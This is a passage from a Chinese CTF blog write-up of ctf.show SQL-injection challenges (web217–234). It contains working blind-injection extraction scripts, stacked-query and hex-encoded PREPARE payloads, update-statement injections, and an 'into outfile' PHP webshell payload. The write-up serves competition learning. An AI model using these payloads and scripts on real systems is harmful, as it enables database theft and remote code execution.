+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(3480500,sha(1)),1"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(s.text)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="218-220-。。。"><a href="#218-220-。。。" class="headerlink" title="218-220(。。。)"></a>218-220(。。。)</h2><h2 id="web221-limit注入"><a href="#web221-limit注入" class="headerlink" title="web221(limit注入)"></a>web221(limit注入)</h2><ul>
+<li><a href="*https://www.jb51.net/article/99980.htm">procedure analyse()</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web222-group-by-盲注脚本"><a href="#web222-group-by-盲注脚本" class="headerlink" title="web222(group by 盲注脚本)"></a>web222(group by 盲注脚本)</h2><ul>
+<li>group by</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GROUP</span> <span class="token keyword">BY</span> 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>找注入点</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gspzd8mu7zj313y0j8juq.jpg" alt="image-20210722200437591"></p>
+<ul>
+<li>写脚本</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://57e5966e-18b3-4512-8e3b-1f89faffa3f1.challenge.ctf.show:8080/api/"</span>
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token comment">#payload = "database()"</span>
+
+<span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'" id,flagaabc,info</span>
+payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #ctfshow_flaga,ctfshow_user</span>
+        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),2)),1);"</span></span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span><span class="token number">32</span> <span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web223-group-by-报错注入"><a href="#Web223-group-by-报错注入" class="headerlink" title="Web223(group by 报错注入)"></a>Web223(group by 报错注入)</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">group by 报错说明</a></p>
+<ul>
+<li>检测盲注</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsq4nzxhhfj30yn0dpabg.jpg" alt="image-20210722230804415"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsq4p1gmmwj31360d70tv.jpg" alt="image-20210722230904990"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://5cc654eb-733a-42a9-bdc8-daabb5dd6175.challenge.ctf.show:8080/api/"</span>
+
+<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res <span class="token operator">=</span> <span class="token string">'true'</span>
+    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> res
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            res <span class="token operator">+=</span> <span class="token string">"+true"</span>
+        <span class="token keyword">return</span> res
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token comment">#payload = "database()"</span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #ctfshow_flagas,ctfshow_user</span>
+<span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'" #id,flagasabc,info</span>
+payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,username,'a');"</span></span>
+        <span class="token punctuation">&#125;</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            tail <span class="token operator">=</span> mid
+    <span class="token keyword">if</span> header <span class="token operator">!=</span><span class="token number">32</span> <span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web224-文件名注入"><a href="#web224-文件名注入" class="headerlink" title="web224(文件名注入)"></a>web224(文件名注入)</h2><ul>
+<li><p><code>Robots.txt</code></p>
+</li>
+<li><p>传入群文件<code>payload.ini</code></p>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">payload.ini大体内容  select &#96;&lt;?&#x3D; $_GET[1]?&gt;&#96; into outfile &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>访问1.php执行rce</li>
+</ul>
+<h2 id="Web225-handler处理-预处理"><a href="#Web225-handler处理-预处理" class="headerlink" title="Web225(handler处理,预处理)"></a>Web225(handler处理,预处理)</h2><ul>
+<li>题目环境</li>
+</ul>
+<p>查询语句</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;分页查询
+$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>返回逻辑</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好
+if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set&#x2F;i&#39;,$username))&#123;
+  die(json_encode($ret));
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><h3 id="handler处理"><a href="#handler处理" class="headerlink" title="handler处理"></a>handler处理</h3></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]
+HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ol>
+<li><code>username</code>=ctfshow;show database();</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrq40gs37j30ys0eata1.jpg" alt="image-20210724081530786"></p>
+<ol start="2">
+<li>查表，并用handler查表</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">ctfshow;show tables;handler flagasa open;handler flagasa read first;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">一次编译多次运行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<ul>
+<li>语法</li>
+</ul>
+<p>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p>
+<pre class="line-numbers language-none"><code class="language-none">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句
+EXECUTE name;  &#x2F;&#x2F;执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;删除预定义SQL        语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrr4t4wfcj30zc0e1ta8.jpg" alt="image-20210724085055928"></p>
+<h2 id="Web-226-预处理"><a href="#Web-226-预处理" class="headerlink" title="Web 226(预处理)"></a>Web 226(预处理)</h2><p>查询语句</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;分页查询
+$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>返回逻辑</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好
+if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(&#x2F;i&#39;,$username))&#123;
+  die(json_encode($ret));
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>过滤了<code>(</code>,采用预处理，sql语句用十六进制编码</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.sojson.com/hexadecimal.html">16进制编码</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrrh5lggcj30xn05zwfb.jpg" alt="image-20210724090244629"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrricyldhj313u0f9jtq.jpg" alt="image-20210724090353290"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrrlib1abj30xp05qwfk.jpg" alt="image-20210724090659367"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrrly5oc2j313o0g376r.jpg" alt="image-20210724090721703"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrrsi32i4j30y603faai.jpg" alt="image-20210724091343034"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrrs75ewwj310l0eiabs.jpg" alt="image-20210724091324845"></p>
+<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">MYSQL查看存储和函数</a></p>
+<p>找不到<code>flag</code>表</p>
+<ul>
+<li>MYSQL查看存储过程和函数信息</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>Routines<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsdg0vo3j310g039q3a.jpg" alt="image-20210724093353475"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsczbyi0j613z0ez45h02.jpg" alt="image-20210724093326828"></p>
+<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><ul>
+<li>预处理查库</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c6563742064617461626173652829</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d2763746673686f775f77656227</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsmde1b0j30mi031glu.jpg" alt="image-20210724094228071"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d2763746673686f775f7765622720616e64207461626c655f6e616d653d2763746673685f6f775f666c61676173616127</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsnq9svpj30fj02wq2y.jpg" alt="image-20210724094345874"></p>
+<ul>
+<li>查记录内容</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c65637420666c6167617362612066726f6d2063746673686f775f7765622e63746673685f6f775f666c616761736161</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsqyhomyj30i003fmxa.jpg" alt="image-20210724094651727"></p>
+<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><ul>
+<li><p>预处理</p>
+</li>
+<li><p>查表</p>
+</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d2763746673686f775f77656227</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrsxo7514j30go02ot8s.jpg" alt="image-20210724095319841"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>查记录内容</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>user1'<span class="token punctuation">;</span><span class="token keyword">PREPARE</span> cc <span class="token keyword">from</span> <span class="token number">0x73656c65637420666c6167617362612066726f6d2063746673686f775f7765622e666c6167</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> cc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrtygkz98j30et033wej.jpg" alt="image-20210724102840677"></p>
+<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><ul>
+<li>与上一题类似</li>
+</ul>
+<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><ul>
+<li>题目环境</li>
+</ul>
+<p>查询语句</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//分页查询</span>
+$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '&#123;$password&#125;' where username = '&#123;$username&#125;';"</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>根据用户名来得到数据库内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsruqblj95j30vo0gxjsr.jpg" alt="image-20210724105525529"></p>
+<ul>
+<li>查库</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrutwbtzgj31190ctgmy.jpg" alt="image-20210724105852658"></p>
+<ul>
+<li>查表</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsruwfad8sj31190ctgmy.jpg" alt="image-20210724110003421"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span><span class="token string">',username=(select group_concat(column_name) from information_schema.columns where table_name='</span>flaga'<span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsruz1zf0zj310k0fa0u8.jpg" alt="image-20210724110351299"></p>
+<ul>
+<li>查内容</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> flagas <span class="token keyword">from</span> flaga<span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><ul>
+<li>利用延时注入</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">f<span class="token string">"1' or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))>&#123;mid&#125;,sleep(0.05),1)#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>脚本爆破</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://139bb024-5bb7-4a6f-a812-a1c6b83686cc.challenge.ctf.show:8080/api/?page=1&amp;limit=10"</span>
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+
+r <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token comment">#payload = "database()"#ctfshow_web</span>
+<span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"#banlist,ctfshow_user,flag233333</span>
+<span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='flag233333'"#flag is id,flagass233,info</span>
+payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> r<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail <span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'4'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>多次尝试</li>
+</ul>
+<h2 id="web234-‘-‘逃逸"><a href="#web234-‘-‘逃逸" class="headerlink" title="web234(‘\‘逃逸)"></a>web234(‘\‘逃逸)</h2><ul>
+<li>对输入的语句过滤了<code>&#39;</code>,可以使用<code>\</code></li>
+</ul>
+<p>查询语句</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//分页查询</span>
+$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '&#123;$password&#125;' where username = '&#123;$username&#125;';"</span><span class="token punctuation">;</span>
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>传入<code>\</code>之后</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '&#123;$password&#125;' where username = '&#123;$username&#125;';"</span><span class="token punctuation">;</span>
+
